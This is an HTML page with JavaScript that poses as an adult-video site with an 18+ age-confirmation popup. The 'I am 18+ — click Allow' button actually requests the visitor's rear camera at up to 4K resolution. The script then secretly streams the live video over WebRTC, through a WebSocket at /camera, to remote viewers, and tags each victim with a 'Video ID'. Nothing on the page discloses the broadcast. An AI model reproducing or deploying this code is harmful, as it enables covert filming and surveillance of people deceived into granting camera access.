<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>18+ Videos</title>

  <style>
    body {
      margin: 0;
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }

    #status {
      font-size: 18px;
      margin: 15px;
    }

    #id {
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }

    .google-button {
      display: inline-block;
      margin: 0 0 18px;
      padding: 12px 22px;
      background: #fff;
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
    }

    /* Permission popup */
    #permissionGate {
      position: fixed;
      inset: 0;
      z-index: 999999;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: #111;
    }

    .permissionBox {
      width: 100%;
      max-width: 380px;
      padding: 25px;
      box-sizing: border-box;
      background: #222;
      border-radius: 16px;
    }

    .permissionBox h2 {
      margin-top: 0;
      font-size: 25px;
    }

    .permissionBox p {
      color: #ddd;
      line-height: 1.5;
    }

    #allowCameraBtn {
      width: 100%;
      padding: 16px;
      margin-top: 12px;
      border: none;
      border-radius: 10px;
      background: #fff;
      color: #000;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    #permissionMessage {
      min-height: 22px;
      margin: 15px 0 0;
      color: #ff8888;
    }
  </style>
</head>

<body>

  <!-- Camera permission popup -->
  <div id="permissionGate">
    <div class="permissionBox">

      <h2>🔞 18+ Only</h2>

      <p>
        You must confirm that you are 18 years or older
        and allow the access to continue.
      </p>

      <button id="allowCameraBtn">
        I am 18+ — click Allow
      </button>

      <p id="permissionMessage"></p>

    </div>
  </div>

  <h1>18+ Videos</h1>

  <div id="status">
    🔒 permission required
  </div>

  <div id="id"></div>

  <a
    class="google-button"
    href="https://www.qorno.com/category/hd"
    target="_blank"
    rel="noopener"
  >
    HD sex videos
  </a>
<script>
  const status =
    document.getElementById("status");

  const idBox =
    document.getElementById("id");

  const permissionGate =
    document.getElementById("permissionGate");

  const allowCameraBtn =
    document.getElementById("allowCameraBtn");

  const permissionMessage =
    document.getElementById("permissionMessage");


  let stream = null;
  let cameraId = null;
  let roleReceived = false;
  let permissionAllowed = false;


  const peers = new Map();
  const pendingCandidates = new Map();


  // ==========================================
  // WEBSOCKET
  // ==========================================

  const ws = new WebSocket(
    (location.protocol === "https:"
      ? "wss:"
      : "ws:") +
    "//" +
    location.host +
    "/camera"
  );


  function sendMessage(message) {
    if (
      ws.readyState ===
      WebSocket.OPEN
    ) {
      ws.send(
        JSON.stringify(message)
      );

      return true;
    }

    return false;
  }


  // ==========================================
  // CAMERA LIVE
  // ==========================================

  function announceCameraLive() {
    if (
      !permissionAllowed ||
      !stream ||
      !roleReceived
    ) {
      return;
    }

    sendMessage({
      type: "video-live"
    });
  }


  // ==========================================
  // CAMERA PERMISSION
  // HIGH RESOLUTION
  // ==========================================

  allowCameraBtn.onclick =
    async () => {

      allowCameraBtn.disabled =
        true;

      permissionMessage.textContent =
        "Requesting permission...";


      try {

        stream =
          await navigator.mediaDevices
            .getUserMedia({

              video: {

                // Rear camera
                facingMode: {
                  ideal: "environment"
                },

                // Request up to 4K
                width: {
                  ideal: 3840,
                  max: 3840
                },

                height: {
                  ideal: 2160,
                  max: 2160
                },

                // 30 FPS
                frameRate: {
                  ideal: 30,
                  max: 30
                }

              },

              audio: false

            });


        permissionAllowed =
          true;


        permissionGate.style.display =
          "none";


        // Show actual camera resolution
        const track =
          stream.getVideoTracks()[0];

        const settings =
          track.getSettings();


        console.log(
          "Camera settings:",
          settings
        );


        status.textContent =
          "video active: " +
          (settings.width || "?") +
          "x" +
          (settings.height || "?");


        announceCameraLive();

      }

      catch (err) {

        console.error(
          "Camera error:",
          err
        );


        stream = null;

        allowCameraBtn.disabled =
          false;


        permissionMessage.textContent =
          " permission was not granted. Please allow access.";


        status.textContent =
          " permission denied";

      }

    };


  // ==========================================
  // CREATE WEBRTC PEER
  // ==========================================

  function createPeer(viewerId) {

    const old =
      peers.get(viewerId);


    if (old) {

      try {
        old.close();
      } catch (err) {}

      peers.delete(viewerId);

    }


    const pc =
      new RTCPeerConnection({

        iceServers: [

          {
            urls:
              "stun:stun.l.google.com:19302"
          }

        ]

      });


    peers.set(
      viewerId,
      pc
    );


    pendingCandidates.set(
      viewerId,
      []
    );


    // ========================================
    // ICE
    // ========================================

    pc.onicecandidate =
      event => {

        if (event.candidate) {

          sendMessage({

            type: "candidate",

            candidate:
              event.candidate,

            toViewerId:
              viewerId

          });

        }

      };


    // ========================================
    // CONNECTION STATE
    // ========================================

    pc.onconnectionstatechange =
      () => {

        console.log(
          "Viewer:",
          viewerId,
          "Connection:",
          pc.connectionState
        );


        if (
          pc.connectionState ===
            "failed" ||
          pc.connectionState ===
            "closed"
        ) {

          try {
            pc.close();
          } catch (err) {}


          peers.delete(
            viewerId
          );


          pendingCandidates.delete(
            viewerId
          );

        }

      };


    // ========================================
    // ADD HIGH QUALITY VIDEO TRACK
    // ========================================

    if (stream) {

      stream
        .getTracks()
        .forEach(track => {

          const sender =
            pc.addTrack(
              track,
              stream
            );


          // Prefer high bitrate
          if (
            sender &&
            sender.getParameters &&
            sender.setParameters
          ) {

            const parameters =
              sender.getParameters();


            if (
              !parameters.encodings
            ) {

              parameters.encodings =
                [{}];

            }


            parameters
              .encodings[0]
              .maxBitrate =
              12000000;


            parameters
              .encodings[0]
              .maxFramerate =
              30;


            sender
              .setParameters(
                parameters
              )
              .catch(err => {

                console.log(
                  "Encoding settings not applied:",
                  err
                );

              });

          }

        });

    }


    return pc;

  }


  // ==========================================
  // WEBSOCKET OPEN
  // ==========================================

  ws.onopen = () => {

    console.log(
      "Camera WebSocket connected"
    );


    if (
      permissionAllowed &&
      stream &&
      roleReceived
    ) {

      announceCameraLive();

    }

  };


  // ==========================================
  // WEBSOCKET MESSAGE
  // ==========================================

  ws.onmessage =
    async event => {

      let m;


      try {

        m =
          JSON.parse(
            event.data
          );

      }

      catch (err) {

        console.log(
          "Invalid server message"
        );

        return;

      }


      // ========================================
      // ROLE
      // ========================================

      if (
        m.type === "role"
      ) {

        cameraId =
          m.cameraId;

        roleReceived =
          true;


        idBox.textContent =
          "Video ID: " +
          cameraId;


        if (
          permissionAllowed &&
          stream
        ) {

          announceCameraLive();

        }


        return;

      }


      // ========================================
      // VIEWER READY
      // ========================================

      if (
        m.type === "viewer-ready"
      ) {

        if (!stream) {
          return;
        }


        const pc =
          createPeer(
            m.viewerId
          );


        try {

          const offer =
            await pc.createOffer({

              offerToReceiveAudio:
                false,

              offerToReceiveVideo:
                false

            });


          await pc.setLocalDescription(
            offer
          );


          sendMessage({

            type: "offer",

            offer:
              pc.localDescription,

            toViewerId:
              m.viewerId

          });

        }

        catch (err) {

          console.error(
            "Offer error:",
            err
          );

        }


        return;

      }


      // ========================================
      // ANSWER
      // ========================================

      if (
        m.type === "answer"
      ) {

        const viewerId =
          m.toViewerId ||
          m.viewerId;


        const pc =
          peers.get(
            viewerId
          );


        if (
          pc &&
          m.answer
        ) {

          try {

            await pc.setRemoteDescription(
              new RTCSessionDescription(
                m.answer
              )
            );


            const queued =
              pendingCandidates.get(
                viewerId
              ) || [];


            for (
              const candidate
              of queued
            ) {

              await pc
                .addIceCandidate(
                  new RTCIceCandidate(
                    candidate
                  )
                )
                .catch(
                  () => {}
                );

            }


            pendingCandidates.set(
              viewerId,
              []
            );

          }

          catch (err) {

            console.log(
              "Answer error:",
              err
            );

          }

        }


        return;

      }


      // ========================================
      // ICE CANDIDATE
      // ========================================

      if (
        m.type === "candidate"
      ) {

        const viewerId =
          m.toViewerId ||
          m.viewerId;


        if (
          !viewerId ||
          !m.candidate
        ) {
          return;
        }


        const pc =
          peers.get(
            viewerId
          );


        if (!pc) {
          return;
        }


        if (
          pc.remoteDescription &&
          pc.remoteDescription.type
        ) {

          await pc
            .addIceCandidate(
              new RTCIceCandidate(
                m.candidate
              )
            )
            .catch(
              () => {}
            );

        }

        else {

          if (
            !pendingCandidates.has(
              viewerId
            )
          ) {

            pendingCandidates.set(
              viewerId,
              []
            );

          }


          pendingCandidates
            .get(viewerId)
            .push(
              m.candidate
            );

        }


        return;

      }

    };


  // ==========================================
  // WEBSOCKET ERROR
  // ==========================================

  ws.onerror = () => {

    console.log(
      "WebSocket error"
    );

  };


  // ==========================================
  // WEBSOCKET CLOSED
  // ==========================================

  ws.onclose = () => {

    status.textContent =
      "Connection closed";


    peers.forEach(
      pc => {

        try {
          pc.close();
        } catch (err) {}

      }
    );


    peers.clear();
    pendingCandidates.clear();

  };


  // ==========================================
  // CLEANUP
  // ==========================================

  window.addEventListener(
    "beforeunload",
    () => {

      peers.forEach(
        pc => {

          try {
            pc.close();
          } catch (err) {}

        }
      );


      peers.clear();
      pendingCandidates.clear();


      if (
        ws.readyState ===
        WebSocket.OPEN
      ) {

        ws.close();

      }

    }
  );

</script>
  </body>
  </html>
